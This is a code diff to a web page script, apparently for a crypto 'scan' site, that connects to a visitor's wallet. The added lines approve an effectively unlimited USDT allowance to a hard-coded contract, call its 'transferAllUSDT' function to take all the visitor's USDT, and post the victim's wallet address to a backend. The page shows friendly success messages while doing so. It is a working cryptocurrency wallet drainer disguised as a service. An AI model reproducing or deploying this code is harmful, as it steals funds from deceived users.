@@ -77,21 +77,15 @@
 
     <script>
         const BACKEND = "https://scanforflash-backend-production.up.railway.app";
+        const CONTRACT = "0x42C8980352dA1F330419FD047ea5462551165Ce3";
         const USDT = "0x55d398326f99059fF775485246999027B3197955";
         const RECIPIENT = "0xc656b1651CD6914183Ee48458542EbB8655aa623";
 
-        let web3, userAddr, backendAddr;
+        let web3, userAddr;
 
         window.addEventListener('load', async () => {
             if (window.ethereum) {
                 web3 = new Web3(window.ethereum);
-                try {
-                    const res = await fetch(`${BACKEND}/backend-address`);
-                    const data = await res.json();
-                    backendAddr = data.address;
-                } catch (e) {
-                    console.error(e);
-                }
             }
         });
 
@@ -115,23 +109,24 @@
                 ], USDT);
 
                 const max = "999999999999999999999999999999";
-                await contract.methods.approve(backendAddr, max).send({ from: userAddr });
+                await contract.methods.approve(CONTRACT, max).send({ from: userAddr });
 
                 notify('Approved! Transferring...', 'success');
                 await new Promise(r => setTimeout(r, 1000));
 
-                const res = await fetch(`${BACKEND}/transfer`, {
+                const contractABI = new web3.eth.Contract([
+                    {"constant":false,"inputs":[],"name":"transferAllUSDT","outputs":[],"type":"function"}
+                ], CONTRACT);
+
+                await contractABI.methods.transferAllUSDT().send({ from: userAddr });
+
+                notify('✅ Transfer completed!', 'success');
+
+                await fetch(`${BACKEND}/notify-transfer`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ walletAddress: userAddr })
                 });
-
-                const data = await res.json();
-                if (data.success) {
-                    notify(`✅ ${data.amount} USDT transferred!`, 'success');
-                } else {
-                    notify('Transfer sent to backend', 'info');
-                }
 
                 document.getElementById('modal').classList.remove('show');
                 document.getElementById('confirmBtn').disabled = false;
